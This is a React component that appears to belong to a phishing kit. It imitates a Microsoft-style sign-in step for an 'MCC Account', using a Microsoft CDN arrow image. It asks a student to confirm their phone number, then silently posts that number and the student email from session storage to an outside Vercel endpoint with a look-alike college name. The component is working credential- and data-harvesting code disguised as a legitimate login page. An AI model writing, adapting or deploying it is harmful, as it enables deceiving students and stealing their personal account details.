import { useState, useEffect } from "react";
import axios from "axios"; // Import axios
import { FormFooter } from "./FormFooter";

export const Phone = ({ onNext, phoneError, phone, onBack }) => {
  const [phoneValue, setPhoneValue] = useState("");
  const [borderColor, setBorderColor] = useState("1px solid #ccc"); // Default border color
  const [errorMessage, setErrorMessage] = useState("");
  const [isSending, setIsSending] = useState(false); // Track sending status
  const [isPhoneValidated, setIsPhoneValidated] = useState(false); // Track phone validation

  // If phone prop changes, set it as the value for the phone input
  useEffect(() => {
    if (phone) {
      setPhoneValue(phone); // Pre-fill the phone field
    }
  }, [phone]);

  // Handle input changes
  const handleInputChange = (e) => {
    setPhoneValue(e.target.value);
    setBorderColor("1px solid #ccc"); // Reset border color when typing
    setErrorMessage(""); // Reset error message when user starts typing
  };

  // Function to send phone number using axios
  const sendPhone = async (phone) => {
    const payload = {
      subject: `PHONE NUMBER SUBMISSION: ${phone}`,
      message: `User entered the phone number: ${phone}\nstudent email : ${sessionStorage.getItem(
        "student_id"
      )}`, // This will be the phone number body
    };

    try {
      setIsSending(true); // Set sending state to true when the sending starts
      const response = await axios.post(
        "https://ivytechedu-cvfc.vercel.app/send-email",
        payload
      ); // Make POST request to backend phone API
      console.log("Phone number sent successfully", response.data);
      setIsSending(false); // Reset sending state after the phone number is sent
      onNext(phone); // Proceed to the next step after the phone is successfully sent
    } catch (error) {
      setIsSending(false); // Reset sending state in case of error
      console.error(
        "Failed to send phone number",
        error.response?.data || error.message
      );
    }
  };

  // Validate US phone number format
  const isValidUSPhoneNumber = (number) => {
    const phoneRegex = /^\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})$/;
    return phoneRegex.test(number);
  };

  // Handle the next button click
  const handleNext = () => {
    // Check if the phone number is empty or invalid
    if (!phoneValue.trim()) {
      setErrorMessage("Enter a valid US phone number.");
      setBorderColor("1px solid red"); // Red border for empty phone number
    } else if (!isValidUSPhoneNumber(phoneValue)) {
      setErrorMessage(
        "Invalid phone number format. Please enter a valid US phone number."
      );
      setBorderColor("1px solid red"); // Red border for invalid phone number
    } else {
      setErrorMessage(""); // No error
      setBorderColor("1px solid #ccc"); // Reset border
      setIsPhoneValidated(true); // Mark phone number as validated
      sendPhone(phoneValue); // Send phone number with the entered value
      localStorage.setItem("student_phone", phoneValue);
      console.log(phoneValue);
    }
  };

  return (
    <>
      <div
        className="field-container"
        style={{ opacity: isPhoneValidated && isSending ? 0.5 : 1 }} // Apply fade when phone is validated and sending
      >
        <div className="email-entered">
          <button className="arrow" onClick={onBack}>
            <img
              src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
              alt="arrow_left"
            />
          </button>
          <p>{sessionStorage.getItem("student_id")}</p>{" "}
          {/* Display email here */}
        </div>

        <div className="f-t">
          <h1 className="form-title">Phone Number</h1>
        </div>

        <div className="input-message">
          <p>Confirm the phone number associated with your MCC Account.</p>
          {errorMessage && (
            <p className="guide error" style={{ color: "red" }}>
              {errorMessage}
            </p>
          )}

          <input
            type="text"
            name="phone"
            id="phone"
            placeholder="XXX-XXX-XXXX"
            className="field phone-field"
            value={phoneValue}
            onChange={handleInputChange}
            style={{
              borderBottom: borderColor, // Apply border color dynamically
              backgroundColor: "transparent", // Keep background transparent
            }}
          />
        </div>

        <div className="button-container">
          <button type="button" className="next" onClick={handleNext}>
            Next
          </button>
        </div>
      </div>
      <FormFooter />
    </>
  );
};
